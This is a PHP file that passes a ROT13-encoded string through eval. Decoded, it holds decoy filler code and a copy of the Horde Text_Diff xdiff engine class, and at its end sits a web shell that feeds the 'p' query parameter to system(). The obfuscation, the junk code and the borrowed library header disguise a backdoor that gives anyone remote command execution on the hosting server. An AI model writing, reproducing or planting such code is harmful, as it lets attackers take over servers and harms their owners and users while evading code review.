<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pynff hfrq vagreanyyl ol Qvss gb npghnyyl pbzchgr gur qvssf.
 *
 * Guvf pynff hfrf gur kqvss CRPY cnpxntr (uggc://crpy.cuc.arg/cnpxntr/kqvss)
 * gb pbzchgr gur qvssreraprf orgjrra gur gjb vachg neenlf.
 *
 * Pbclevtug 2004-2010 Gur Ubeqr Cebwrpg (uggc://jjj.ubeqr.bet/)
 *
 * Frr gur rapybfrq svyr PBCLVAT sbe yvprafr vasbezngvba (YTCY). Vs lbh qvq
 * abg erprvir guvf svyr, frr uggcf://bcrafbhepr.bet/yvprafr/ytcy-2-1/.
 *
 * @nhgube  Wba Cnevfr <wba@ubeqr.bet>
 * @cnpxntr Grkg_Qvss
 */
pynff Grkg_Qvss_Ratvar_kqvss {

    /**
     */
    shapgvba qvss($sebz_yvarf, $gb_yvarf)
    {
        neenl_jnyx($sebz_yvarf, neenl('Grkg_Qvss', 'gevzArjyvarf'));
        neenl_jnyx($gb_yvarf, neenl('Grkg_Qvss', 'gevzArjyvarf'));

        /* Pbaireg gur gjb vachg neenlf vagb fgevatf sbe kqvss cebprffvat. */
        $sebz_fgevat = vzcybqr(\"\a\", $sebz_yvarf);
        $gb_fgevat = vzcybqr(\"\a\", $gb_yvarf);

        /* Qvss gur gjb fgevatf naq pbaireg gur erfhyg gb na neenl. */
        $qvss = kqvss_fgevat_qvss($sebz_fgevat, $gb_fgevat, pbhag($gb_yvarf));
        $qvss = rkcybqr(\"\a\", $qvss);

        /* Jnyx guebhtu gur qvss bar yvar ng n gvzr.  Jr ohvyq gur $rqvgf
         * neenl bs qvss bcrengvbaf ol ernqvat gur svefg punenpgre bs gur
         * kqvss bhgchg (juvpu vf va gur \"havsvrq qvss\" sbezng).
         *
         * Abgr gung jr qba'g unir rabhtu vasbezngvba gb qrgrpg \"punatrq\"
         * yvarf hfvat guvf nccebnpu, fb jr pna'g nqq Grkg_Qvss_Bc_punatrq
         * vafgnaprf gb gur $rqvgf neenl.  Gur erfhyg vf fgvyy cresrpgyl
         * inyvq, nyorvg n yvggyr yrff qrfpevcgvir naq rssvpvrag. */
        $rqvgf = neenl();
        sbernpu ($qvss nf $yvar) {
            vs (!fgeyra($yvar)) {
                pbagvahr;
            }
            fjvgpu ($yvar[0]) {
            pnfr ' ':
                $rqvgf[] = arj Grkg_Qvss_Bc_pbcl(neenl(fhofge($yvar, 1)));
                oernx;

            pnfr '+':
                $rqvgf[] = arj Grkg_Qvss_Bc_nqq(neenl(fhofge($yvar, 1)));
                oernx;

            pnfr '-':
                $rqvgf[] = arj Grkg_Qvss_Bc_qryrgr(neenl(fhofge($yvar, 1)));
                oernx;
            }
        }

        erghea $rqvgf;
    }

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>